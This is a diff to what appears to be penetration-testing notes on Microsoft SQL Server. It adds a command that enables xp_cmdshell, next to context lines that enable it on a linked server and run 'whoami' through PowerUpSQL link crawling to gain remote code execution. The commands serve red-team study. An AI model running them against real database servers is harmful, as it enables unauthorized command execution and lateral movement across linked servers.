@@ -1393,6 +1393,13 @@ Now -
 Turn xp_cmdshell on:
 ```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```
 
+OR
+
+```EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;```
+
+
+now rce - 
+
 ```Get-SQLServerLinkCrawl -Instance db01-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
 
 OR via SQL:
